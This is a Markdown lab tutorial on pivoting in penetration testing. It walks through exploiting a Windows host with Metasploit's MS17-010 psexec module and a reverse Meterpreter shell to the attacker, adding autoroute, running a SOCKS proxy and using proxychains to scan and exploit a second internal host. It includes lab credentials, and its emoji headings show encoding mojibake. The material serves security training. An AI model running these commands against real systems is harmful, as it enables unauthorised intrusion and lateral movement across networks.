````markdown
# Pivoting and Routing Tables in Penetration Testing

This guide explains how to pivot from one compromised target (`Target1`) to another internal target (`Target2`) using **Metasploit, SOCKS Proxy, and Proxychains**.  
Each step includes explanation of **what happens after the command** and **why it is needed**.  

---

## üîë Key Concepts

### Pivoting
- Pivoting = using a compromised machine (`Target1`) as a **bridge** to access other machines (`Target2`) in a restricted/internal network.

---

### SOCKS Proxy
- A **SOCKS proxy** forwards network traffic through a proxy server.  
- In this setup:  
  - Metasploit runs a SOCKS proxy on Kali (`127.0.0.1:1080`).  
  - Any traffic sent to this proxy is tunneled through `Target1` ‚Üí then into the internal network (`192.168.205.0/24`).  

üëâ **Here we use SOCKS to make the internal network reachable for tools outside Metasploit.**

---

### Proxychains
- **Proxychains** forces any application (nmap, msfconsole, sqlmap, etc.) to use a proxy (like our SOCKS5 proxy).  
- By combining Proxychains with the SOCKS proxy:  
  - We can run tools **from Kali**, but they behave as if running **from inside Target1**.  
  - Without Proxychains, only Metasploit modules can reach Target2 (because autoroute works only in Metasploit).  

üëâ **Here we use Proxychains to redirect Kali‚Äôs external tools through the SOCKS proxy into Target1 ‚Üí Target2.**

---

### Strict Chain vs Dynamic Chain
- **Strict Chain**: Traffic must follow all proxies listed in config in order. If one fails, the whole chain fails.  
- **Dynamic Chain**: Skips dead proxies, more flexible and practical.  

üëâ That‚Äôs why we enable **dynamic_chain** and disable **strict_chain** in Proxychains config.

---

## üñ•Ô∏è Network Setup

- **Attacker (Kali Linux)**  
  - IP: `192.168.0.139`

- **Target1 (Windows 10 - Compromised Pivot)**  
  - External: `192.168.0.117`  
  - Internal: `192.168.205.105`

- **Target2 (Windows 10 - Internal Only)**  
  - Internal: `192.168.205.106`

---

## üöÄ Step 1: Exploit Target1

```bash
msfconsole
````

‚û°Ô∏è Launch Metasploit.

```bash
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
```

‚û°Ô∏è Load EternalBlue exploit and set reverse Meterpreter payload.

```bash
set RHOST 192.168.0.117
set SMBUSER forensic
set SMBPASS admin
set LHOST 192.168.0.139
set LPORT 6622
```

‚û°Ô∏è Configure attacker and victim details.

```bash
exploit
```

‚û°Ô∏è Get Meterpreter session on **Target1**. üéâ

---

## üö© Step 2: Add Routing in Metasploit

```bash
use post/multi/manage/autoroute
set SESSION 1
run
```

‚û°Ô∏è Adds a route to the **internal network** via Target1.

* Now Metasploit modules can reach `192.168.205.0/24`.
* ‚ùó But external tools (like `nmap`) still **cannot** reach Target2.

```bash
route
```

‚û°Ô∏è Confirms new route exists in Metasploit‚Äôs routing table.

---

## üß© Step 3: Enable SOCKS Proxy

```bash
use auxiliary/server/socks_proxy
run
```

‚û°Ô∏è Starts a SOCKS proxy on Kali (`127.0.0.1:1080`).

```bash
jobs
```

‚û°Ô∏è Confirms SOCKS proxy is running.

**Why this step?**

* Routing table lets **only Metasploit** talk to Target2.
* SOCKS proxy exposes that route to **all tools** via a local proxy.

---

## ‚öôÔ∏è Step 4: Configure Proxychains

```bash
mousepad /etc/proxychains4.conf
```

* Edit config file:

  ```text
  dynamic_chain     # enable dynamic chain (flexible)
  # strict_chain    # disable strict chain
  socks5 127.0.0.1 1080   # use our Metasploit SOCKS proxy
  ```

‚û°Ô∏è Now any command run with `proxychains` will tunnel traffic through Target1 ‚Üí Target2.

---

## üîç Step 5: Scan and Exploit Target2

### Scan Target2

```bash
proxychains nmap -p 139,445 -sT -n -Pn 192.168.205.106
```

‚û°Ô∏è Nmap scan now reaches Target2 via the SOCKS proxy.

### Launch Metasploit Through Proxychains

```bash
proxychains msfconsole
```

‚û°Ô∏è Starts Metasploit with all traffic redirected through Proxychains.

### Exploit Target2

```bash
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST 192.168.205.106
set SMBUSER forensic
set SMBPASS admin
set LPORT 6644
exploit
```

‚û°Ô∏è Exploits Target2 (internal machine) successfully.

---

## üìä How It All Works (Flow Diagram)

```text
   [ Kali Linux ]
        |
        |  proxychains ‚Üí SOCKS5 (127.0.0.1:1080)
        |
   [ Target1 - Compromised ]
        |
        |  internal network (192.168.205.0/24)
        |
   [ Target2 - Internal Only ]
```

* **Step 2 (autoroute)**: Adds route, but usable only inside Metasploit.
* **Step 3 (SOCKS proxy)**: Opens that route to external tools.
* **Step 4 (Proxychains)**: Forces Kali‚Äôs tools to use SOCKS proxy.
* **Result**: Any tool from Kali can now access `Target2` as if we were on Target1.

---

## ‚úÖ Key Takeaways

* **SOCKS Proxy**: Opens the pivot path to external tools.
* **Proxychains**: Redirects Kali‚Äôs tool traffic into the SOCKS proxy.
* **Dynamic Chain**: More flexible, skips dead proxies.
* **Strict Chain**: Rigid, fails if one proxy is down.
* **Workflow**:

  1. Exploit Target1.
  2. Add route.
  3. Start SOCKS proxy.
  4. Configure Proxychains.
  5. Scan/exploit Target2 using any tool.

---
